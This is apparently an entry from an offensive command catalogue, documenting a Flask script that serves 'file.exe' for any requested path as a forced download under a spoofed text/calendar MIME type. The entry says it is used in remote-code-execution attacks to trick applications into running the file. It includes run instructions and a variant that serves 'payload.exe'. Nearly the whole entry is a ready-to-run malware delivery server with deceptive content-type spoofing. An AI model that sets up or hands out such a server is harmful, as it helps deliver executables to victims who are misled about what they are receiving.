---
id: cmd-flask-malicious-serve
data: |-
  from flask import Flask, send_from_directory
  app = Flask(__name__)
  @app.route('/<path:path>')
  def hello(path):
      return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
  if __name__ == '__main__':
      app.run(port=80,host="0.0.0.0")
tags:
  - http-server
  - mime-spoofing
type: command
output: |2
   * Running on all addresses (0.0.0.0)
   * Running on http://127.0.0.1:80
   * Running on http://[::]:80
executor: python
platforms:
  - Linux
  - Python
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.053Z'
verified: false
validated: true
submitted: true
---
# flask-serve-malicious-file

## Command

```python
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

## Description

This Python script using Flask sets up an HTTP server that serves a file named file.exe from the current directory for any path requested, forcing it as a download attachment with a spoofed text/calendar MIME type. It's used in RCE attacks to trick applications into executing the file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| port | Server port (default 80) | No |
| host | Bind address (0.0.0.0 for all interfaces) | No |
| mimetype | Content-Type header (text/calendar) | Yes |
| as_attachment | Force download (True) | Yes |
| file.exe | Path to malicious file in current dir | Yes |

## Examples

### Basic Usage

Save as server.py and run:

```bash
python server.py
```

### Advanced Usage

Modify for different port or file:

```python
# Change port to 8080
app.run(port=8080, host="0.0.0.0")
# Or serve different file
return send_from_directory(".", "payload.exe", ...)
```

## Expected Output

Server starts and logs incoming requests. Successful request returns the file with headers: Content-Type: text/calendar; Content-Disposition: attachment; filename=file.exe.

## Related

- [[Related Procedure: Setup-Flask-Server-for-Malicious-File]]
